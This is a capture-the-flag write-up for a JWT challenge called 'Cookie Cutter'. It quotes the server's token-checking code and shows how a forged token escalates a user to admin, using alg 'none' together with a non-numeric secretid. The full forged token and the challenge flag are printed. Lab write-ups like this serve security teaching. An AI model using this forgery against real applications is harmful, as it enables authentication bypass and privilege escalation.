# Cookie Cutter
The chalange is about hacking the JWT cookie. 
To get the flag we have to pass this check:
```javascript
let sid = JSON.parse(Buffer.from(cookie.split(".")[1], 'base64').toString()).secretid;
if(sid==undefined||sid>=secrets.length||sid<0){throw "invalid sid"}
let decoded = jwt.verify(cookie, secrets[sid]);
if(decoded.perms=="admin"){
    res.locals.flag = true;
}
```
where the `secrets` is an array containing randomly generated `secrets`

```javascript
let secret = crypto.randomBytes(32)
cookie = jwt.sign({perms:"user",secretid:secrets.length,rolled:res.locals.rolled?"yes":"no"}, secret, {algorithm: "HS256"});
secrets.push(secret);
```

The cookie looks like:
```json
{
  "alg": "HS256",
  "typ": "JWT"
}
{
  "perms": "user",
  "secretid": 1394,
  "rolled": "no",
  "iat": 1555925889
}
```

By providing the cookie: `eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJwZXJtcyI6ImFkbWluIiwic2VjcmV0aWQiOiJyYW5kb21zdHIiLCJyb2xsZWQiOiJubyJ9.` which after decoding looks like

```json
{
  "typ": "JWT",
  "alg": "none"
}
{
  "perms": "admin",
  "secretid": "randomstr",
  "rolled": "no"
}
```

we will get the flag, becasue `secrets["randomstr"]` will return `undefined` and we set the `algorithm` to `none`.

The flag is: **actf{defund_ate_the_cookies_and_left_no_sign}**
